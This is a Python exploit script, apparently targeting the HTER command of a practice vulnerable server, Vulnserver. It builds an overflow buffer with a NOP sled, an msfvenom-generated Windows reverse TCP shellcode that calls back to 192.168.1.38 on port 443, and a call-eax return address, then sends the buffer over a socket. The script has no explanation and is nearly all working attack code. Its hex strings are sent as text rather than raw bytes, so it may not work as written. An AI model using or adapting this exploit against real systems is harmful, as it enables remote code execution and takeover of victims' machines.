from pwn import *

host = "192.168.1.37"
port = 9999

#call eax points to our C buffer 62501084
eax = "84105062"

#62501203 jmp esp
esp = "03125062"

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.38 LPORT=443 EXITFUNC=thread -e x86/alpha_mixed bufferregister=eax -f python -v shellcode
#Payload size: 702 bytes
shellcode = "89e3d9c6d973f45b53594949494949494949494943434343434337515a6a415850304130416b41415132414232424230424241425850384142754a49696c69786c4257706330755045306e695a457031695053544e6b705066504c4b5632644c6e6b536276746c4b70724758444f4c77715a54667561496f4c6c574c6171734c4442546c657049514a6f566d73315a675a424b42636266376c4b736232304c4b526a656c4c4b626c423161686a43337833316b6176316e6b30596130766179434e6b315934584d33674a67396c4b46544c4b36615a763651596f4c6c4a617a6f644d455158475478397050755a566773516d4a58574b634d764450754d3433684e6b436877546551585371764e6b744c626b4e6b3638354c655158536c4b55546e6b53315a704f79573444646134514b336b31714369436a3361796f3970714f636f427a6e6b6452486b6c4d336d524835634562477067705538307764334742536f50545358304c343736467777696f38556f486e7055514550533037595a6471443630624845794f70324b45506b4f5a754270763076307050373030503150727061786a4a666f494f39706b4f5a756d47424a766553584f3049383551446670683662477066614f4b6e693976724a72307056627753586d495935734465314b4f59454c456f307434366c596f626e344852554a4c517838706d65593243664b4f6b6530685063724d653453306f796d3330575147727735615876624a5672336956365a426b4d5176584773745754456c477177716c4d7044675444504f36677051546364705056363276614630467056326e7636514652733366717854394a6c474f6f764b4f4a754c494d30704e31463736596f6650624835584f77554d7530396f7a756f4b4d30576d357a455a31784f564f654d6d4f6d6b4f6e35574c7666616c355a6b30396b3970307576656d6b315735434432424f335a55506633796f79454141"
nops = "90" * 32

#2053 * C  from fuzzer
buffer = "HTER 0505c" 
buffer += nops + shellcode
buffer += "A" * (2040 - 4 - len(nops) - len(shellcode)) 
buffer += eax
buffer += "A" * (4106 - len(buffer))
#625011AF      FFE4             JMP ESP

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buffer.encode("UTF-8"))
s.close()
